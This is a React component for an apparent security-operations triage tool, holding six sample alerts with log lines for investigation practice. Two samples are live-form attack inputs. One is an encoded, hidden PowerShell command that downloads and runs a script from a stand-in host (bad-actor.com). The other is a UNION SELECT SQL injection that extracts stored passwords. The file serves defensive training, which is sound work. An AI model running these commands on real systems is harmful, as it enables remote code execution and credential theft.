import React from 'react'
import { Terminal, Shield, Key, Globe, ShieldAlert, Cpu } from 'lucide-react'

const templates = [
  {
    id: 'credential_compromise',
    label: 'Credential Compromise',
    icon: Key,
    alert: "Multiple failed login attempts followed by a successful login from a new IP address for user 'j.doe@enterprise.com'.",
    logs: `2026-06-26 10:14:02 - WinEventLog - Security - EventID 4625 - Logon Failure - User: j.doe - IP: 198.51.100.42 - Reason: Unknown user name or bad password
2026-06-26 10:14:15 - WinEventLog - Security - EventID 4625 - Logon Failure - User: j.doe - IP: 198.51.100.42 - Reason: Unknown user name or bad password
2026-06-26 10:15:01 - WinEventLog - Security - EventID 4624 - Logon Success - User: j.doe - IP: 198.51.100.42 - Logon Type: 3 (Network)`
  },
  {
    id: 'ssh_brute_force',
    label: 'SSH Brute Force',
    icon: Terminal,
    alert: "SSH brute force attack detected on bastion host (10.0.1.5) from external IP 203.0.113.88.",
    logs: `Jun 26 10:15:02 bastion sshd[12455]: Failed password for invalid user admin from 203.0.113.88 port 48922 ssh2
Jun 26 10:15:04 bastion sshd[12457]: Failed password for invalid user root from 203.0.113.88 port 48930 ssh2
Jun 26 10:15:06 bastion sshd[12459]: Failed password for invalid user guest from 203.0.113.88 port 48938 ssh2`
  },
  {
    id: 'powershell_attack',
    label: 'PowerShell Attack',
    icon: Cpu,
    alert: "Suspicious PowerShell execution with encoded command detected on domain controller (DC01).",
    logs: `2026-06-26 10:20:00 - Sysmon - EventID 1 - Process Creation - Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe - CommandLine: powershell.exe -nop -w hidden -encodedcommand SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmFkLWFjdG9yLmNvbS9wYXlsb2FkLnBzMScp`
  },
  {
    id: 'vpn_suspicious_login',
    label: 'VPN Suspicious Login',
    icon: Globe,
    alert: "Impossible travel detected for user 'a.smith@enterprise.com' between New York and London within 30 minutes.",
    logs: `2026-06-26 10:00:12 - VPN-GW-01 - User a.smith login successful from IP 198.51.100.12 (New York, US)
2026-06-26 10:28:45 - VPN-GW-02 - User a.smith login successful from IP 91.198.174.192 (London, UK)`
  },
  {
    id: 'malware_activity',
    label: 'Malware Activity',
    icon: ShieldAlert,
    alert: "Known malware hash execution blocked on endpoint workstation-44.",
    logs: `2026-06-26 10:22:15 - Sysmon - EventID 1 - Process Creation - Image: C:\\Users\\public\\mimikatz.exe - Hash: SHA256=1782400269339ABCDEF1234567890BCDEF1234567890ABCDEF1234567890
2026-06-26 10:22:16 - AV-Agent - Alert: File blocked. Threat: HackTool:Win32/Mimikatz.A`
  },
  {
    id: 'web_attack',
    label: 'Web Attack',
    icon: Shield,
    alert: "SQL injection attempt detected on public web server (10.0.2.10) targeting parameter 'id'.",
    logs: `198.51.100.77 - - [26/Jun/2026:10:25:01 +0000] "GET /products.php?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users HTTP/1.1" 200 4522 "-" "Mozilla/5.0"`
  }
]

function InvestigationTemplates({ onSelect, disabled = false }) {
  return (
    <div className="space-y-2">
      <h4 className="text-[10px] font-bold uppercase tracking-wider text-slate-500">
        Investigation Templates
      </h4>
      <div className="grid grid-cols-2 gap-2.5 sm:grid-cols-3">
        {templates.map((tpl) => {
          const Icon = tpl.icon
          return (
            <button
              key={tpl.id}
              type="button"
              disabled={disabled}
              onClick={() => onSelect(tpl.alert, tpl.logs)}
              className="flex items-center gap-2.5 p-2 rounded-xl border border-slate-800/60 bg-slate-900/10 hover:border-slate-800/80 hover:bg-slate-900/30 text-slate-350 hover:text-soc-primary transition duration-150 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed text-left group min-h-[46px]"
            >
              <div className="p-1.5 rounded-lg bg-slate-950/30 text-slate-500 group-hover:text-soc-primary transition-colors shrink-0">
                <Icon className="h-3.5 w-3.5" />
              </div>
              <span className="text-xs font-bold leading-tight truncate">{tpl.label}</span>
            </button>
          )
        })}
      </div>
    </div>
  )
}

export default InvestigationTemplates
export { templates }
